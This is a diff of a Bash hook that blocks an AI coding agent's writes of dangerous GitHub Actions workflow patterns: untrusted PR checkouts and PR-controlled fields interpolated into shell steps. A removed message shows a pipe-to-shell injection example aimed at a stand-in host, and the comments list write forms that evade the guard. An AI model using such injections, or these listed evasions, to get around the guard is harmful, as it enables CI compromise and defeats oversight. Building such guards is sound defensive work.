@@ -1,54 +1,13 @@
 #!/bin/bash
-# Absolute-path shebang (not `env bash`): the fail-open guarantee must hold even
-# under a stripped/broken PATH, where `env bash` itself exits 127.
-#
-# PreToolUse guard on writes to .github/workflows/. DENIES exactly two shapes —
-# the ones with no legitimate form, where the workflow hands repository secrets or
-# a write token to code the repository does not control:
-#
-#   1. pull_request_target (or workflow_run) checking out the untrusted head.
-#   2. An attacker-controlled ${{ github.event.* }} field interpolated into a
-#      `run:` block, which is shell substitution, not argument passing.
-#
-# Everything else workflow-audit.sh reports — unpinned actions, a missing
-# permissions: block, self-hosted runners on fork triggers — is a WARN there and
-# is NOT denied here. A deny that fires on the ambiguous cases is a deny that gets
-# turned off, and then the two unambiguous ones stop being blocked too.
-#
-# Why a hook at all, given both shapes are well-documented: nobody asks. Workflow
-# files get edited during unrelated work and reviewed for step ordering. The hook
-# is the thing that asks, at the only moment the answer is cheap.
-#
-# BASH WRITES (0.8.2). A heredoc body or echo/printf arguments whose pipeline writes an
-# in-scope file are judged exactly like a Write of that text to that file
-# (cc_bash_write_chunks for the text, cc_bash_write_targets for the file it lands in; a
-# relative target matches the relative patterns as spelled). Text fed to a command that
-# writes no file (`yq eval - <<EOF`, `gh api --input - <<EOF`) is not read. An append
-# (`>>`) is judged on the appended text alone, as an Edit is on its new_string, so a
-# rule-1 trigger already in the file whose `ref:` arrives by append is NOT caught.
-# echo/printf arguments are read as written with ONE leading quote stripped, so
-# `echo '  - run: …' >> .github/workflows/ci.yml` is judged as its line. An echo chunk is
-# one line, so it can only ever meet rule 2. NOT caught on an echo: a flag or extra space
-# before the quote (`echo -n '…'`, `echo  '…'`), `printf '%s\n' '…'` (the format comes
-# first), a run line that itself holds `<<`, an escaped multi-line echo (`echo -e '…\n…'`,
-# `$'…'`, not unescaped), and a quoted string spanning lines. Also NOT caught: interpreter
-# writes (python open(), php file_put_contents), cp/mv/install of a prepared file into
-# .github/workflows/, `sed -i`/`perl -i` edits (the target resolves, no text is judged),
-# `{ …; } > f` groups, a path held in a variable, a path relative to an earlier `cd` in
-# the command or to a session cwd already under .github/ (targets match as spelled), a
-# here-string, a second heredoc on one line, printf format substitution, and any target
-# after the first on one writer (`tee a b` checks `a`).
-#
-# Fail-open: any error, missing jq, or unparseable input allows the write.
-# CC_WORKFLOW_GUARD unset: the /config option cc_workflow_guard decides.
+# PreToolUse on writes to a .github/workflows/ file or a .github/actions/*/action.yml (Write, Edit, MultiEdit, Bash heredoc/echo): denies a privileged-trigger checkout of the PR head, and a PR-author ${{ github.event.* }} field in a run: step. Fail-open; CC_WORKFLOW_GUARD=off disables; unset, /config cc_workflow_guard decides.
+# Misses what workflow-audit.sh only warns on; text piped to a command that writes no file (`yq eval - <<EOF`); an appended `ref:` completing a rule-1 trigger; on echo, a flag or extra space before the quote, `printf '%s\n' '…'` (format first), a run line holding `<<`, an escaped or multi-line echo (`echo -e`, `$'…'`), a quoted string spanning lines; interpreter writes, cp/mv/install, `sed -i`/`perl -i`, `{ …; } > f`, a path in a variable or relative to a `cd` or a cwd under .github/, a here-string, a second heredoc on one line, printf format substitution, tee's later targets; an action.yml elsewhere, a composite shelling out to a script.
+# Why, limits, history: rationale/derivations/plugin-devops.md § plugins/devops/hooks/workflow-guard.sh
 
 # Shared block templates/blocks/option-resolver.md — edit there, re-paste byte-for-byte.
 # Why, limits, history: rationale/derivations/templates-and-blocks.md § templates/blocks/option-resolver.md
 # cc_option <ENV_NAME> <default> [<level-file>] prints, status 0, the first non-empty of: variable ENV_NAME,
 # <level-file>'s first word, option CLAUDE_PLUGIN_OPTION_<ENV_NAME> (true/false as on/off), <default>.
 # The host exports only SAVED options, so <default> must equal the manifest's default.
-# A non-empty variable beats the option: the environment is shared, so one export before launch
-# switches every plugin that reads it.
 # Misses: a malformed name, which yields <default>; a variable passed instead of a literal name; a value outside the vocabulary.
 cc_option() {
   local v="" opt
@@ -70,8 +29,7 @@ cc_option() {
 # Why, limits, history: rationale/derivations/templates-and-blocks.md § templates/blocks/bash-write-targets.md
 # cc_bash_write_targets <command> prints each path the command writes through `>`/`>>`, `[sudo] tee` or `sed -i`/`perl -i`,
 # one per line as spelled; heredoc bodies and quoted text never match. A path guard keeps existing files under its root.
-# BSD sed's -I always takes the next word as its backup suffix, so that word is never a target; after a bare sed -i,
-# a `''` or `.`-led word is read as one too, unless it would be the only file.
+# A backup suffix is never a target: the word after BSD sed's -I, or a `''` or `.`-led word after a bare sed -i unless it is the only file.
 # Misses: interpreter writes, cp/mv/install, a path in a variable, a glob, a `\` line continuation, a digit- or &-led
 # redirect and `>&`, sed/perl/tee behind another command word (gsed, /usr/bin/sed, env, xargs, sudo -u), a `-`-led
 # operand with no `/` or `.`, operands cut short by a `&` inside `$(( ))`/`${ }`, every line after a `<<\EOF` opener.
@@ -239,13 +197,7 @@ cc_bash_write_chunks() {
     }'
 }
 
-# A COMPOSITE ACTION IS THE SAME SINK. `.github/actions/<name>/action.yml` carries
-# `runs.steps[].run:` and is called from a workflow with that workflow's token, so the
-# identical `${{ github.event.pull_request.title }}` interpolation is the identical
-# command execution — and until 2026-09-22 it was allowed here while the same body in
-# `workflows/ci.yml` was denied. Rule 1 cannot fire on a composite (it has no `on:`
-# triggers); rule 2 is the whole point. NOT covered: an action.yml anywhere else in the
-# tree, and a composite that shells out to a script file the guard never sees.
+# A composite action's run: steps execute with the calling workflow's token, so rule 2 applies there; rule 1 has no on: to read.
 in_scope() {
   case "$1" in
     */.github/workflows/*.yml|*/.github/workflows/*.yaml|.github/workflows/*.yml|.github/workflows/*.yaml) return 0 ;;
@@ -261,12 +213,10 @@ judge_workflow() {
   # 1. Untrusted checkout under a privileged trigger.
   if printf '%s' "$text" | grep -qE '^[[:space:]]*(pull_request_target|workflow_run):' \
      && printf '%s' "$text" | grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.head|workflow_run\.head))'; then
-    reason="This workflow triggers on pull_request_target/workflow_run — which runs with the BASE repository's secrets and a write token — and checks out the untrusted head ref. That executes fork-authored code inside a privileged context; it is GitHub's own documented critical anti-pattern, and it reads to a reviewer as 'checks out the PR, correct'. Build the PR in the pull_request context with no secrets, or check out the base ref and treat the PR tree as data."
+    reason="devops blocked this write: the workflow checks out the pull request's code under pull_request_target or workflow_run, which runs it with the repository's secrets and a write token. Build the PR under pull_request with no secrets, or check out the base ref and treat the PR tree as data."
   fi
 
-  # 2. Attacker-controlled expression in a shell step. Matched by LEAF: base.sha
-  #    and number are GitHub-generated and safe, and denying them would make this
-  #    fire on ordinary CI.
+  # 2. Matched by leaf: base.sha and number are GitHub-generated and safe; denying them would fire on ordinary CI.
   if [ -z "$reason" ]; then
     if printf '%s' "$text" | awk '
         /^[[:space:]]*-?[[:space:]]*run:/ { inrun=1 }
@@ -274,15 +224,12 @@ judge_workflow() {
         /^[[:space:]]*(uses|with|env|if|name):/ { inrun=0 }
         END { exit !found }
       '; then
-      reason="A \${{ github.event.* }} field a pull-request author can type — a title, body, branch name or commit message — is interpolated directly into a run: block. GitHub substitutes it into the shell BEFORE the shell runs, so a title of '\"; curl evil.sh | sh; #' is command execution, not a string. Pass it through an env: block and reference \"\$VAR\" inside the script, where the shell treats it as data."
+      reason="devops blocked this write: a run: step puts a \${{ github.event.* }} field a pull-request author controls (title, body, branch name, commit message) straight into the shell, where it runs as code. Pass it through env: and reference \"\$VAR\" in the script."
     fi
   fi
 }
 {
   input=$(cat)
-  # OFF-SWITCH. Until 2026-09-15 this guard had none: the only way out was
-  # uninstalling the plugin. Every other guard in the marketplace ships one,
-  # and a global install makes "turn it off here" a real need.
   [ "$(cc_option CC_WORKFLOW_GUARD on)" = "off" ] && exit 0
   command -v jq >/dev/null 2>&1 || exit 0
   tool=$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null) || exit 0
@@ -330,13 +277,10 @@ EOF_C
   fi
 
   [ -n "$reason" ] || exit 0
-  # The path in the message has to be one the READER can type. `plugins/devops/scripts/…`
-  # is this marketplace's own layout and does not exist on an installer's disk; resolve
-  # the real root the host hands the hook, and fall back to this script's own directory.
+  # The message names a path the installer can type: this repository's plugins/devops/ layout is not on their disk.
   auditroot="${CLAUDE_PLUGIN_ROOT:-$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)}"
-  reason="$reason (file: $file)  Run bash ${auditroot}/scripts/workflow-audit.sh for the full report, including the warn-level findings this hook deliberately does not block."
-  # Name the escape in the message that blocks you.
-  reason="$reason CC_WORKFLOW_GUARD=off disables this guard for the session."
+  reason="$reason (file: $file) Full report: bash ${auditroot}/scripts/workflow-audit.sh."
+  reason="$reason CC_WORKFLOW_GUARD=off turns this check off."
 
   jq -cn --arg r "$reason" \
     '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:"deny",permissionDecisionReason:$r}}' 2>/dev/null
